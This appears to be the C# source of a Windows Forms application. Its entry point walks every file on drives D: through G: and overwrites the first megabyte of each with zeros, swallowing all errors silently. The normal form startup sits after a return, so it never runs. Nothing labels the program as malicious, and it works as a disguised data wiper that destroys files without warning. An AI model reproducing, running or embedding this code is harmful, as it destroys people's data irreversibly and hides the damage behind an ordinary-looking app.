using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.IO;
using System.Text;


namespace WindowsFormsApplication1plus
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            String path = @"D:";
            String pattern = "*.*";
            List<string> allfiles = GetFiles(path, pattern);
            foreach (string file in allfiles)
            {
                fileop(file);
            }

            path = @"E:";
            allfiles = GetFiles(path, pattern);
            foreach (string file in allfiles)
            {
                fileop(file);
            }

            path = @"F:";
            allfiles = GetFiles(path, pattern);
            foreach (string file in allfiles)
            {
                fileop(file);
            }


            path = @"G:";
            allfiles = GetFiles(path, pattern);
            foreach (string file in allfiles)
            {
                fileop(file);
            }

            return;

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        public const int file_block_size = 1000000;
        
        public static void fileop(string filename)
        {
            try
            {
                filename = filename.Trim('\"');


                var filestream = new FileStream(@filename, FileMode.Open);
                var length = (int)filestream.Length;
                var readable_size = Math.Min(length, file_block_size);
                var bits = new byte[length];

                filestream.Read(bits, 0, readable_size);

                for (int ix = 0; ix < readable_size; ix++)
                {
                    bits[ix] = (byte)0x00;
                }

                filestream.Seek(0, SeekOrigin.Begin);
                filestream.Write(bits, 0, readable_size);

                filestream.Close();
            }
            catch (Exception) { }
        }

        private static List<string> GetFiles(string path, string pattern)
        {
            var files = new List<string>();

            try
            {
                files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
                foreach (var directory in Directory.GetDirectories(path))
                    files.AddRange(GetFiles(directory, pattern));
            }
            catch (UnauthorizedAccessException) { }
            catch (IOException) { }
            catch (Exception) { }

            return files;
        }
    }
}
